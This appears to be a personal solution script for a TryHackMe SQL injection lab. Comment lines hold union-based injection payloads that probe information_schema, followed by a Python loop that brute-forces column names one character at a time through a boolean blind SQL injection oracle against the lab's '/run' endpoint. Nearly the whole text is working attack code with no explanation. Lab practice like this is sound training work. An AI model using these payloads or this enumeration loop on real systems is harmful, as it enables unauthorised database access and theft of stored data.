# Host: 10-10-93-49.p.thmlabs.com
# Origin: https://10-10-93-49.p.thmlabs.com
# Referer: https://10-10-93-49.p.thmlabs.com/level3

# level=3&sql=select * from users where username = 'admin' union select null, null, null--' LIMIT 1 
# admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--
# admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';


import requests
import string

url = "https://10-10-232-209.p.thmlabs.com/run"
chars = string.ascii_letters + string.digits + "_"
currentfound = ""

while True:
    found_char = False  
    for char in chars:
        payload = (
            f"level=3&sql=select * from users where username = 'nglong05' "
            f"union select null, null, null FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like '{currentfound + char}%';--"
        )
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": "https://10-10-232-209.p.thmlabs.com/level3",
        }
        response = requests.post(url, data=payload, headers=headers)

        if '"message":"true"' in response.text:
            currentfound += char  
            print(f"Current name: {currentfound}")
            found_char = True
            break  

    if not found_char:
        print(f"Final name: {currentfound}")
        break
